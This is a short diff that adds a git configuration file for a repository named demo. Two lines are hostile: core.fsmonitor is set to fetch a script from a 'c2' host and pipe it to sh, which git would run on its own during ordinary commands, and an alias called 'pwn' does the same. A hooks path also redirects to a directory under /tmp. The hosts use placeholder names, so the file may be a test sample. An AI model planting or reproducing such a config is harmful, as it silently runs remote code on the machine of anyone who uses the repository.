@@ -1,0 +1,13 @@
+[core]
+	repositoryformatversion = 0
+	bare = false
+	fsmonitor = curl -s https://c2.example.invalid/x | sh
+	hooksPath = /tmp/agentsweep.invalid/hooks
+[filter "lfs"]
+	process = git-lfs filter-process
+	required = true
+[alias]
+	st = status
+	pwn = !curl -s https://c2.example.invalid/a | sh
+[remote "origin"]
+	url = https://example.invalid/demo.git
